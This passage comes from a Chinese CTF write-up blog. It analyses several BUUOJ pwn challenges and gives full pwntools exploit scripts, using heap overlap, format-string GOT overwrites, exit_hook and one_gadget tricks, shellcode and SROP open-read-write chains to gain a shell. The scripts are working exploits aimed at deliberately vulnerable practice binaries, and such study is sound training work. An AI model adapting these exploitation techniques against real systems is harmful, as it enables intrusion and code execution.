        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28987</span>)
        <span class="hljs-keyword">continue</span>

info_addr(<span class="hljs-string">'leak'</span>,leak)
libc_addr = leak - <span class="hljs-number">0x3c56a3</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)
malloc_hook = <span class="hljs-number">0x3c4b10</span> + libc_addr
free(<span class="hljs-number">0</span>)
free(<span class="hljs-number">2</span>)
free(<span class="hljs-number">0</span>)
edit(<span class="hljs-number">0</span>,p64(malloc_hook - <span class="hljs-number">0x13</span>))
add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)
one = rce16[<span class="hljs-number">3</span>] + libc_addr
data = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">3</span> + p64(one)
add(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,data)
sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)
sla(<span class="hljs-string">'size of weapon:'</span>,<span class="hljs-string">'10'</span>)
sla(<span class="hljs-string">'dex'</span>,<span class="hljs-string">'9'</span>)
<span class="hljs-comment"># add(9,0x30,'1')</span>
<span class="hljs-comment"># debug()</span>
itr()</code></pre></div>

<h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a><code>starctf_2019_babyshell</code></h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>会有一个函数检查你的shellcode是否满足要求。</p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = a1; *i; ++i )
 &#123;
   <span class="hljs-keyword">for</span> ( j = &amp;unk_400978; *j &amp;&amp; *j != *i; ++j )
     ;
   <span class="hljs-keyword">if</span> ( !*j )                                  <span class="hljs-comment">// 检查shellcode合法的函数，遍历shellcode的每个字符，在0x400987处找是否有匹配。</span>
     <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
 &#125;
 <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;</code></pre></div>

<p>需要0x400987地址处的字节码匹配。倘若发现有不匹配的字节，就直接check不过。</p>
<p>可以用的有 <code>pop rdx、pop rdi、syscall</code></p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>有师傅的做法，就是用这3个汇编，强行凑出一个read，然后把shellcode再次读到mmap的buf上合适的位置（此题加12），再次调用到shellcode。</p>
<p><a href="https://www.cnblogs.com/Rookle/p/12895895.html" target="_blank" rel="noopener">https://www.cnblogs.com/Rookle/p/12895895.html</a><br><a href="https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/105863820" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105863820</a></p>
<div class="hljs"><pre><code class="hljs undefined">对于一些受限的shellcode，我们最好的办法是构造<span class="hljs-built_in">read</span>系统调用。</code></pre></div>

<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有就是这个循环，其实直接可以用<code>\x00</code>截断，因为开头循环条件2 给0 直接就不执行下面的检测循环，return 1 走了。</p>
<p><strong>但是跳过去需要，提前再布置几个机器码字节保证不影响下面的shellcode。</strong></p>
<p>可以直接在ida里面设置显示机器码，以后直接选取合适的机器码整上去就可以了。</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">00 </span><span class="hljs-number">5</span>A <span class="hljs-number">5</span>A                    add     [rdx+<span class="hljs-number">5</span>Ah], bl</code></pre></div>

<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())
s(<span class="hljs-string">'\x00'</span>+ <span class="hljs-string">'\x5a'</span> +<span class="hljs-string">'\x00'</span>+ shellcode)</code></pre></div>

<h3 id="题记-3"><a href="#题记-3" class="headerlink" title="题记"></a>题记</h3><p>感觉个人shellcode能力较差，得抽时间学习下。</p>
<h2 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a><code>hfctf_2020_marksman</code></h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>上来给了libc地址，可以任意地址3个字节的写入。</p>
<h4 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h4><p>修改那里的地址，才能控制程序流程。</p>
<p>可以修改<code>exit_hook</code>:<br><a href="https://blog.csdn.net/qq_43116977/article/details/105485947" target="_blank" rel="noopener">https://blog.csdn.net/qq_43116977/article/details/105485947</a><br>参考这里。</p>
<p>在退出时：</p>
<p><code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code></p>
<p>修改<code>__rtld_lock_unlock_recursive</code>或者<code>__rtld_lock_lock_recursive</code>即可。</p>
<p><strong>gdb 快速获取这个地址的办法：</strong></p>
<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p &amp;<span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_rtld_lock_recursive</span></code></pre></div>

<h4 id="难点2"><a href="#难点2" class="headerlink" title="难点2"></a>难点2</h4><p>one gadget的调整。</p>
<p>其中 <code>one_gadget -lx</code>  这个可以设置扫描等级获取更多的one gadget。</p>
<p>并且在程序中：</p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_BC2</span><span class="hljs-params">(_BYTE *a1)</span>
</span>&#123;
  <span class="hljs-keyword">if</span> ( (*a1 != <span class="hljs-number">0xC5</span>u || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xF2</span>u) &amp;&amp; (*a1 != <span class="hljs-number">0x22</span> || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xF3</span>u) &amp;&amp; *a1 != <span class="hljs-number">0x8C</span>u &amp;&amp; a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xA3</span>u )
    <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You always want a Gold Finger!"</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
&#125;</code></pre></div>

<p>对写入的地址也给限制了不能出现这几个字节。<br>其中就让很好的:</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x10a38c</span> execve(<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>, environ)
<span class="hljs-symbol">constraints:</span>
  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>] == NULL</code></pre></div>

<p>不让写入使用了。其他的因为地址小，爆破差距大，或者限制条件高，不适合使用。</p>
<p>想办法调整一下，来实现上面这个one gadget的使用。</p>
<p><a href="http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90" target="_blank" rel="noopener">http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90</a></p>
<p>参考 taqini师傅的这个文章，发现其中就有对这个的分析，发现最重要的就是：<br><code>rsi rdi rdx</code>要给控制好，其中这个gadget附近的汇编如图所示</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/uQchWa.png" srcset="/img/loading.gif" alt></p>
<p>其中8c结尾的汇编之后是一定要执行的，其中就控制了<code>rsi rdi rdx</code>。并且8c这条汇编也是不可以跳过，控制的rax，在这个one gadget 中是很有用的，否则当初作者在写这个one gadget怎么没有跳过，直接从93结尾汇编开始了。</p>
<p>向上看有个call指令，这是对接下来的one gadget执行并无造成重要参数大的影响的，所以可以尝试向上写一个地址，让这个gadget从<code>0x10a387</code>开始。</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/hDqu69.png" srcset="/img/loading.gif" alt><br>执行下去发现是可以满足<code>execve(&quot;/bin/sh&quot;, 0, environ)</code>的。</p>
<p>此题中对于exit hook 的改写中，<code>_dl_rtld_lock_recursive</code> 可以完成条件的满足。<code>_dl_rtld_unlock_recursive</code>不可以。<br>具体跟过去会发现是在第2和参数出了问题，且在one gadget中第二个参数的控制很玄学，且很难控制，让人头大。</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">ru(<span class="hljs-string">'0x'</span>)
libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">'puts'</span>]
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
exit_hook = <span class="hljs-number">0x81df60</span> + libc_base
one = <span class="hljs-number">0x10a387</span> + libc_base
<span class="hljs-comment"># debug()</span>
sl(str(exit_hook))
sla(<span class="hljs-string">'biang'</span>,chr((one  &amp;<span class="hljs-number">0xff</span>)))
sla(<span class="hljs-string">'biang!'</span>,chr((one &gt;&gt; <span class="hljs-number">8</span> &amp;<span class="hljs-number">0xff</span>)))
sla(<span class="hljs-string">'biang!'</span>,chr((one &gt;&gt; <span class="hljs-number">16</span> &amp;<span class="hljs-number">0xff</span>)))
itr()</code></pre></div>


<h3 id="题记-4"><a href="#题记-4" class="headerlink" title="题记"></a>题记</h3><p>对于修改<code>_dl_fini</code>，又发现了一个很好的参考链接：<br><a href="https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1</a></p>
<h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a><code>sctf_2019_easy_heap</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><ul>
<li>开头mmap 一段内存 rwx</li>
<li>libc 2.27的off by null</li>
<li>没有show</li>
</ul>
<h3 id="攻击思路-6"><a href="#攻击思路-6" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>先上来申请一个0x1000的内存块，然后释放，可以保证每次申请的堆块上都存有libc信息，准备攻击利用</li>
<li>off by null 留出 2个重叠的堆块</li>
<li>一个攻击 mmap，另一个攻击malloc hook</li>
</ul>
<p>由于tcache 基本没有什么检查，利用起来较为容易。</p>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./sctf_2019_easy_heap'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28382</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'ize'</span>,str(size))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">"dex"</span>,str(idx))
    sa(<span class="hljs-string">'tent'</span>,str(data))
ru(<span class="hljs-string">'0x'</span>)
mmap = int(r(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)
add(<span class="hljs-number">0x1000</span>)
add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>
free(<span class="hljs-number">0</span>)
add(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#0</span>
add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#2</span>
add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span>
add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
    add(<span class="hljs-number">0x90</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
    free(i+<span class="hljs-number">5</span>)
    add(<span class="hljs-number">0xf0</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
    free(i+<span class="hljs-number">5</span>)

free(<span class="hljs-number">0</span>)
edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x40</span>))
free(<span class="hljs-number">4</span>)
add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#0</span>
add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#4</span>
add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#5</span>
add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#6</span>
add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#7</span>
add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#8</span>
free(<span class="hljs-number">4</span>)
free(<span class="hljs-number">7</span>)
edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x60'</span> + <span class="hljs-string">'\n'</span>)
edit(<span class="hljs-number">0</span>,p64(mmap) + <span class="hljs-string">'\n'</span>)
add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#4</span>
add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#7</span>
add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#9</span>

free(<span class="hljs-number">6</span>)
free(<span class="hljs-number">8</span>)
edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\xc0'</span> + <span class="hljs-string">'\n'</span>)
edit(<span class="hljs-number">5</span>,p8(<span class="hljs-number">0x30</span>) + <span class="hljs-string">'\n'</span>)
add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#6</span>
add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#8</span>
add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#10</span>
shellcode = <span class="hljs-string">"""
  call here
  .ascii "/bin/sh"
  .byte 0
here:
   pop rdi
   xor rsi,rsi
   xor rdx,rdx
   mov rax,0x3b
   syscall
"""</span>
edit(<span class="hljs-number">9</span>,asm(shellcode) + <span class="hljs-string">'\n'</span>)
edit(<span class="hljs-number">10</span>,p64(mmap) + <span class="hljs-string">'\n'</span>)
add(<span class="hljs-number">0x200</span>)
<span class="hljs-comment"># debug()</span>
itr()</code></pre></div>

<h3 id="题记-5"><a href="#题记-5" class="headerlink" title="题记"></a>题记</h3><p>这个题还有一种办法攻击mmap就是用unlink来进行，因为题目就给了&amp;heap ，题目预期解就是这样。</p>
<p>另外一种解法，就是攻击stdout，泄漏libc地址，然后攻击malloc hook。</p>
<h2 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><code>ciscn_2019_sw_1</code></h2><h4 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h4><p>32位，单次格式化字符串的利用。无法一次性的获得shell。至少运行2次。</p>
<p>攻击<code>__do_global_dtors_aux_fini_array_entry</code>，让其再次运行一次，且同时改 printf got 的值为system plt。然后送一个 <code>/bin/sh\x00</code>即可。</p>
<h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python">offset = <span class="hljs-number">4</span>
payload = fmtstr_payload(offset,&#123;<span class="hljs-number">0x804979C</span>:<span class="hljs-number">0x8048534</span>,elf.got[<span class="hljs-string">'printf'</span>]:elf.plt[<span class="hljs-string">'system'</span>]&#125;,write_size = <span class="hljs-string">"short"</span>,numbwritten = <span class="hljs-number">0</span>)
s(payload)
sleep(<span class="hljs-number">1</span>)
sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'/bin/sh\x00'</span>)
itr()</code></pre></div>

<p>因为是32位，用<code>fmtstr_payload</code>是很好用的。</p>
<h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><ul>
<li>开头不输入<code>\n</code>，48字符可以泄露出stack地址</li>
<li>有第一段可控的栈，且可以覆盖到heap ptr</li>
</ul>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400A29</span><span class="hljs-params">()</span>
</span>&#123;
  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span>
  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>

  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>uLL);
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give me money~"</span>);
  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);
  <span class="hljs-built_in">strcpy</span>(dest, &amp;buf);
  ptr = dest;
  <span class="hljs-keyword">return</span> sub_4009C4();
&#125;</code></pre></div>

<ul>
<li>一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。</li>
</ul>
<p>保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。</p>
<h3 id="攻击思路-7"><a href="#攻击思路-7" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address</li>
<li>申请同大小的堆，改ret address jmp 到 shellcode</li>
</ul>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./pwn200'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26670</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'long'</span>,str(size))
    sa(<span class="hljs-string">'me'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)

shellcode = asm(shellcraft.sh())
sa(<span class="hljs-string">'u'</span>,shellcode)
ru(<span class="hljs-string">'\x05'</span>)
leak_stack = uu64(r(<span class="hljs-number">6</span>))
info_addr(<span class="hljs-string">'leak_stack'</span>,leak_stack)
shellcode_addr = leak_stack - <span class="hljs-number">0x50</span>
<span class="hljs-comment"># debug()</span>
sla(<span class="hljs-string">'id'</span>,<span class="hljs-string">'65'</span>)
payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(leak_stack - <span class="hljs-number">0x90</span>)
sa(<span class="hljs-string">'money'</span>,payload)
free()
payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(shellcode_addr)
add(<span class="hljs-number">0x38</span>,payload)
sleep(<span class="hljs-number">0.2</span>)
sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)
<span class="hljs-comment"># debug()</span>
itr()</code></pre></div>

<h2 id="vn-pwn-babybabypwn"><a href="#vn-pwn-babybabypwn" class="headerlink" title="vn_pwn_babybabypwn"></a><code>vn_pwn_babybabypwn</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><ul>
<li>开了沙盒保护，只能orw</li>
<li>开始给了libc地址</li>
<li>程序主要执行了<code>rt_sigreturn</code>，肯定是奔着srop去的</li>
</ul>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul>
<li>orw的rop应该往哪里写，栈地址是不知道的</li>
</ul>
<p>可以在libc上找一段无用的地方进行写即可。比如 libc的bss，free hook段。</p>
<ul>
<li>有的gadget 使用ropgadget找不到</li>
</ul>
<div class="hljs"><pre><code class="hljs python">libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()</code></pre></div>

<p>可以通过机器码来找。</p>
<ul>
<li>srop 中frame执行的顺序</li>
</ul>
<p>frame.rip 是先执行的地址。而 frame.rsp 的值就是我们执行完 frame.rip 后，要执行的值</p>
<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = './vn_pwn_babybabypwn'
elf = ELF(local_file)
context.log_level = 'debug'
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote('node3.buuoj.cn',25535)
    libc = elf.libc
    #libc = ELF('.')
context.arch = elf.arch
context.terminal = ['tmux','neww']
#,''splitw','-h'
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
rce18 = [0x4f2c5,0x4f322,0x10a38c]
realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
arae18 = 0x3ebca0
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')
    gdb.attach(io)
    pause()

'
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015
 0005: 0x15 0x09 0x00 0x00000009  if (A == mmap) goto 0015
 0006: 0x15 0x08 0x00 0x0000000a  if (A == mprotect) goto 0015
 0007: 0x15 0x07 0x00 0x00000029  if (A == socket) goto 0015
 0008: 0x15 0x06 0x00 0x0000002a  if (A == connect) goto 0015
 0009: 0x15 0x05 0x00 0x00000031  if (A == bind) goto 0015
 0010: 0x15 0x04 0x00 0x00000032  if (A == listen) goto 0015
 0011: 0x15 0x03 0x00 0x00000038  if (A == clone) goto 0015
 0012: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0015
 0013: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0015
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0015: 0x06 0x00 0x00 0x00000000  return KILL
'

ru('0x')
libc_base =  int(r(12),16) - libc.sym['puts']
info_addr('libc_base',libc_base)

free_hook = 0x3c67a8 + libc_base
read = libc.sym['read'] + libc_base
puts = libc.sym['puts'] + libc_base
open = libc.sym['open'] + libc_base
pop_rdi= 0x0000000000021102 + libc_base
pop_rsi = 0x00000000000202e8 + libc_base
pop_rdx = 0x0000000000001b92 + libc_base
syscall_ret = libc.search(asm("syscall \nret")).next() + libc_base
# syscall_ret = libc_base + 0x00000000000bc375 #: syscall; ret; 
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = free_hook
frame.rdx = 0x300
frame.rip = syscall_ret
frame.rsp = free_hook
payload = str(frame)[8:] #前8字节是rt_sigreturn 其并不需要伪造。程序是主动调用的 sigreturn

# print(hex(len(frame)))

s(payload)
orw = flat([
    pop_rdi,0,pop_rsi,free_hook,pop_rdx,8,read,
    pop_rdi,free_hook,pop_rsi,0,pop_rdx,0,open,
    pop_rdi,3,pop_rsi,free_hook,pop_rdx,0x30,read,
    pop_rdi,free_hook,puts
])

s(orw)
sleep(0.2)
s('./flag')
# debug()
itr()</code></pre></div>

<h3 id="题记-6"><a href="#题记-6" class="headerlink" title="题记"></a>题记</h3><div class="hljs"><pre><code class="hljs python">payload = str(frame)[<span class="hljs-number">8</span>:]</code></pre></div>

<p>对于为什么要从8字节开始的理解？</p>
<p>前8字节是<code>rt_sigreturn</code>,其有什么用？</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/votJbl.png" srcset="/img/loading.gif" alt></p>
<p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用sigreturn系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条ret指令会使得执行流跳转到这段sigreturn代码，被动地进行sigreturn系统调用,把原来保存的寄存器信息弹回去，最后恢复进程的执行。</p>
